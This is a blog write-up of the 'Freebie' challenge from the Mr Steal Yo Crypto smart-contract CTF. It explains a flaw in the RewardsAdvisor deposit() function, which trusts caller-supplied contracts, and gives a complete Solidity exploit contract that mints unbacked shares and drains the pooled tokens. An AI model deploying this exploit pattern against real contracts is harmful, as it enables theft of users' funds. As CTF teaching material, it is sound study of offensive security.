---
title: "Mr Steal Yo Crypto — Freebie"
date: 2023-07-22
draft: false
description: "CTF - 7"
tags: ["CTF"]
series: ["CTF"]
series_order: 7
topics: ["CTF"]
showAuthor: false
showAuthorsBadges : false
---

This is the #7 challenge of [Mr Steal Yo Crypto](https://mrstealyocrypto.xyz/index.html). I will try to explain how to find the vulnerability.

> A set of challenges to learn offensive security of smart contracts. Featuring interesting challenges loosely (or directly) inspired by real-world exploits.
>
> Created by [@0xToshii](https://twitter.com/0xToshii)

I used the foundry version for this CTF: [mr-steal-yo-crypto-ctf-foundry](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement)

![Mr Steal Yo Crypto](https://cdn-images-1.medium.com/max/800/1*67w9ffBxLP4AMvoxHowZ2w.jpeg)

## Freebie

> There’s a staking contract RewardsAdvisor which accepts FARM tokens and mints an equivalent amount of xFARM. xFARM is used for governance and within [redacted]’s defi ecosystem.
> Your task is to drain 99.99%+ of the FARM tokens from this contract.

- [See the contracts](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement/src/freebie)
- [Complete the challenge](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/7-freebie.sol)

## Review of the contract

### GovToken.sol

For the moment, I don’t have something to say on this contract.

### RewardsAdvisor.sol

Well, it didn’t take a long time for spotting the vulnerability because it is in the first function: `deposit()`. We are able to mint an infinite amount of shares because if the parameter address `from` is a contract, then the contract calls the `owner()` and `delegatedTransferERC20()` functions of the `from` contract. If you saw my previous article, it is the same issue as the challenge #2 — Safu Vault and challenge #6 — Tasty Stake.

```solidity
// @param farmDeposit Amount of FARM transferred from sender to RewardsAdvisor
// @param to Address to which liquidity tokens are minted
// @param from Address from which tokens are transferred
// @return shares Quantity of liquidity tokens minted as a result of deposit
function deposit(uint256 farmDeposit, address payable from, address to) external returns (uint256 shares) {
    require(farmDeposit > 0, "deposits must be nonzero ");
    require(to != address(0) && to != address(this), "to ");
    require(from != address(0) && from != address(this), "from ");
    
    shares = farmDeposit;
    if (xfarm.totalSupply() != 0) {
        uint256 farmBalance = farm.balanceOf(address(this));
        shares = (shares * xfarm.totalSupply()) / farmBalance;
    }
    
    if (isContract(from)) {
        require(IAdvisor(from).owner() == msg.sender); // admin
        IAdvisor(from).delegatedTransferERC20(address(farm), address(this), farmDeposit);
    } else {
        require(from == msg.sender); // user
        farm.safeTransferFrom(from, address(this), farmDeposit);
    }
    
    xfarm.mint(to, shares);
}
```

## Exploit the vulnerability

This is the same vulnerability as the challenge #2 — Safu Vault and challenge #6 — Tasty Stake.

Here is a quick solution:

```solidity
contract Exploit {
    Token farm;
    GovToken govToken;
    RewardsAdvisor rewardsAdvisor;
    address private attacker;

    constructor(address _target, address _farm, address _xfarm) {
        farm = Token(_farm);
        govToken = GovToken(_xfarm);
        rewardsAdvisor = RewardsAdvisor(_target);
        attacker = msg.sender;
    }

    // Will be called during deposit()
    function owner() external returns (address) {
        return address(this);
    }

    // Will be called during deposit()
    function delegatedTransferERC20(address token, address to, uint256 amount) external {
        // Do nothing in the exploit contract
    }

    // Deposit() will call our contract and so we will skip some process like the transfer of farm token
    function pwn(address _target) external {
        uint256 amount = govToken.balanceOf(address(_target)) * uint256(10000) / uint256(1);
        console.log("amount shares we want : ", amount);
        rewardsAdvisor.deposit(amount, payable(address(this)), address(this));
        console.log("amount shares exploit got : ", govToken.balanceOf(address(this)));
        rewardsAdvisor.withdraw(govToken.balanceOf(address(this)), attacker, payable(address(this)));
        console.log("amount farm attacker got : ", farm.balanceOf(address(attacker)));
        // farm.transfer(owner, farm.balanceOf(address(this)));
    }
}
```

You can check my test file [here](https://github.com/gp-ngmi/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/7-freebie.sol).

## Acknowledgement

Thank you [https://stermi.xyz/](https://stermi.xyz/) for inspiring me to write articles on CTF ^^.